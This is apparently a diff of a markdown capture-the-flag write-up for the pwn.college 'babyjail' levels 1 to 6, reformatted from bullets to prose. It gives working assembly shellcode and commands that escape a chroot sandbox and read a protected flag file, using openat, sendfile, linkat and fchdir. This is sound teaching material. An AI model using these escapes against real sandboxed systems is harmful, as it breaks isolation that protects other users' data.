@@ -11,18 +11,21 @@ pagination_prev: null
    The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
    program (argv[1]).
 
-- Let's look at the source code.
+Let's look at the source code.
 ```
 assert(chroot(jail_path) == 0);
 ```
-- Notice that even though the jail has been set, the program did not change directory to `/` and put us in that jail.
-- That means we are effectively not in jail.
-- If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.
-- In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail`.
+Notice that even though the jail has been set, the program did not change directory to `/` and put us in that jail.
+
+That means we are effectively not in jail.
+
+If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.
+
+In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail`.
 ```
 hacker@sandboxing-level-1:~$ /challenge/babyjail_level1 ../../flag 
 ```
-- The first `..` escapes from the `/jail` and second `..` escapes from the `/tmp` directory.
+The first `..` escapes from the `/jail` and second `..` escapes from the `/tmp` directory.
 
 &nbsp;
 
@@ -30,7 +33,7 @@ hacker@sandboxing-level-1:~$ /challenge/babyjail_level1 ../../flag
 > You may open a specified file, as given by the first argument to the program (argv[1]).
 > You may upload custom shellcode to do whatever you want.
 
-- We can use the shellcode that we wrote for Shellcode Injection.
+We can use the shellcode that we wrote for Shellcode Injection.
 ```
 .global _start
 .intel_syntax noprefix
@@ -63,21 +66,23 @@ _start:
 flag:
 	.string "../../flag"
 ```
-- We can compile the program using `gcc`.
+We can compile the program using `gcc`.
 ```
-~$ gcc -nostdlib ./shellcode.s -o ./shellcode
+$ gcc -nostdlib ./shellcode.s -o ./shellcode
 ```
-- Let's extract the .text section using `objcopy`.
+Let's extract the .text section using `objcopy`.
 ```
-~$ objcopy --dump-section .text=./shellcode.bin ./shellcode
+$ objcopy --dump-section .text=./shellcode.bin ./shellcode
 ```
-- Now we can send this code as STDIN.
+Now we can send this code as STDIN.
 ```
-~$ /challenge/babyjail_level2 / < shellcode.bin
+$ /challenge/babyjail_level2 / < shellcode.bin
 ```
-- Note that we are in the `hacker` directory.
-- The `shellcraft` module from `pwn` allows us to create a shellcode easily. You could also use this method.
-- However creating our own shellcode allows us to have more control over it.
+Note that we are in the `hacker` directory.
+
+The `shellcraft` module from `pwn` allows us to create a shellcode easily. You could also use this method.
+
+However creating our own shellcode allows us to have more control over it.
 ```python
 from pwn import *
 
@@ -98,20 +103,22 @@ p.interactive()
 > You may open a specified file, as given by the first argument to the program (argv[1]).
 > You may upload custom shellcode to do whatever you want.
 
- - On examining the code for this level, we can see that this time we have been put into the jail.
+On examining the code for this level, we can see that this time we have been put into the jail.
 ```
 assert(chroot(jail_path) == 0);
 
 puts("Moving the current working directory into the jail.\n");
 assert(chdir("/") == 0);
 ```
-- That means we cannot just `../../flag` our way to getting the flag.
-- Fortunately, there is `openat` syscall in linux which takes as input a directory file descriptor and then the path of the file to be opened relative to the directory.
+That means we cannot just `../../flag` our way to getting the flag.
+
+Fortunately, there is `openat` syscall in linux which takes as input a directory file descriptor and then the path of the file to be opened relative to the directory.
 ```
 int openat(int dirfd, const char pathname, int flags, mode_t mode);
 ```
-- In our case, the `dirfd` will be `3`, the first three being STDIN, STDERR and STDOUT.
-- The `open` syscall would look something like this:
+In our case, the `dirfd` will be `3`, the first three being STDIN, STDERR and STDOUT.
+
+The `open` syscall would look something like this:
 ```
 # Openat syscall
 mov rdi, 3
@@ -124,18 +131,20 @@ syscall
 flag:
 	.string "flag"
 ```
-- Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.
-- The result of the open syscall is a file descriptor.
-- We can check it's value in the practice mode using `strace` which traces every system call.
+Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.
+
+The result of the open syscall is a file descriptor.
+
+We can check it's value in the practice mode using `strace` which traces every system call.
 ```
-~$ sudo strace /challenge/babyjail_level3 / < /home/hacker/shellcode.bin
+$ sudo strace /challenge/babyjail_level3 / < /home/hacker/shellcode.bin
 
 ; -- snip --
 openat(3, "flag", O_RDONLY)             = 4
 read(4, "pwn.college{practice}\n", 1000) = 22
 ; -- snip --
 ```
-- This result is stored in `$rax` as is the case with most syscall that return a value.
+This result is stored in `$rax` as is the case with most syscall that return a value.
 ```
 # Read syscall
 mov rdi, rax
@@ -144,13 +153,15 @@ mov rdx, 1000
 mov rax, 0x00
 syscall
 ```
-- We can pass this shellcode to the challenge.
+We can pass this shellcode to the challenge.
 ```
-~$ /challenge/babyjail_level3 / < /home/hacker/shellcode.bin
+$ /challenge/babyjail_level3 / < /home/hacker/shellcode.bin
 ```
-- Note that `/` is our `argv[1]`, which we are using as reference in `openat`.
-- Since this directory is opened before `chroot()` is executed it won't be in the jail.
-- Congratulations! We have escaped `chroot`.
+Note that `/` is our `argv[1]`, which we are using as reference in `openat`.
+
+Since this directory is opened before `chroot()` is executed it won't be in the jail.
+
+Congratulations! We have escaped `chroot`.
 ```
 .global _start
 .intel_syntax noprefix
@@ -192,13 +203,15 @@ flag:
 ## level 4
 > Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "openat", "read", "write", "sendfile".
 
-- We could very well use the previous level's code but let's try something new.
-- The `sendfile` command is a combination of the `read` and `write` system calls. It's also more efficient as it does not require data to be transferred to and from user space.
-- It takes the following arguments:
+We could very well use the previous level's code but let's try something new.
+
+The `sendfile` command is a combination of the `read` and `write` system calls. It's also more efficient as it does not require data to be transferred to and from user space.
+
+It takes the following arguments:
 ```
 ssize_t sendfile(int out_fd, int in_fd, off_t *_offset, size_t _count);
 ```
-- In our case the `out_fd` will be `1` for STDOUT.
+In our case the `out_fd` will be `1` for STDOUT.
 ```
 # Sendfile syscall
 mov rdi, 1
@@ -208,7 +221,7 @@ mov r10, 1000
 mov rax, 0x28
 syscall
 ```
-- Replace the `read` and `write` syscalls with the above code.
+Replace the `read` and `write` syscalls with the above code.
 
 ```
 .global _start
@@ -245,14 +258,17 @@ flag:
 ## level 5
 > Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "linkat", "open", "read", "write", "sendfile"
 
-- We can no longer use `openat`, but now we are allowed to use `linkat`.
--  It takes five arguments.
+We can no longer use `openat`, but now we are allowed to use `linkat`.
+
+It takes five arguments.
 ```
 int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
 ```
-- A hard link is an entry that associate a name with a file. 
-- Using `linkat` we ca create a hard link in `/tmp/jail/` that points to the `/flag` file in root `/` directory.
-- This allows us to access `/flag` inside of `/tmp/jail/` using a different name.
+A hard link is an entry that associate a name with a file. 
+
+Using `linkat` we ca create a hard link in `/tmp/jail/` that points to the `/flag` file in root `/` directory.
+
+This allows us to access `/flag` inside of `/tmp/jail/` using a different name.
 ```
 # Linkat syscall
 mov rdi, 3
@@ -269,8 +285,9 @@ old_path:
 new_path: 
 .string "/flag"
 ```
-- Note that `linkat` returns a value of 0 on success.
-- Now we can access `/flag` using `/flag2.txt`.
+Note that `linkat` returns a value of 0 on success.
+
+Now we can access `/flag` using `/flag2.txt`.
 
 ```
 .global _start
@@ -321,11 +338,11 @@ flag:
 ## level 6 
 > Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "fchdir", "open", "read", "write", "sendfile".
 
-- The `fchdir` syscall works similar to `chdir`, the only difference is that it takes a file descriptor as argument.
+The `fchdir` syscall works similar to `chdir`, the only difference is that it takes a file descriptor as argument.
 ```
 int fchdir(int fd);
 ```
-- So we can effectively just jump out of the `jail/`.
+So we can effectively just jump out of the `jail/`.
 ```
 # Fchdir syscall
 mov rdi, 3
